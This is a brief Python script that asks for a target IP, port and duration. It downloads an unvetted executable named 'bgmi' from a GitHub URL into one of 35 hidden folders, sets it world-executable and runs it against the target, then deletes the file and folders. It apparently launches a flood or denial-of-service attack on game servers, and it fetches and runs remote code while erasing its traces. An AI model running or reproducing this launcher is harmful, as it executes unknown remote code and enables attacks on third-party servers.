import os
import urllib.request
import time
import shutil

# Step 1: Get user inputs
ip = input("Enter IP address: ")
port = input("Enter port: ")
time_input = input("Enter time (in seconds): ")
time_duration = int(time_input)

# Step 2: Define the URL of the bash script
bash_script_url = "https://github.com/hwop/akki69/raw/master/bgmi"

# Step 3: Create the hidden folders .script0 to .script34
base_folder = ".script"
for i in range(35):
    folder_name = f"{base_folder}{i}"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)

# Step 4: Download the bash script to the last folder (.script34)
final_folder = f"{base_folder}34"
bash_script_path = os.path.join(final_folder, "bgmi")
urllib.request.urlretrieve(bash_script_url, bash_script_path)

# Step 5: Give execute permissions to the bash script
os.chmod(bash_script_path, 0o777)

# Step 6: Run the bash script with the user inputs
os.system(f"./{bash_script_path} {ip} {port} {time_input} 1000")

# Step 7: Wait for the specified time
time.sleep(time_duration)

# Step 8: Delete the downloaded script and all created folders
shutil.rmtree(final_folder)
for i in range(34, -1, -1):
    folder_name = f"{base_folder}{i}"
    if os.path.exists(folder_name):
        shutil.rmtree(folder_name)
      
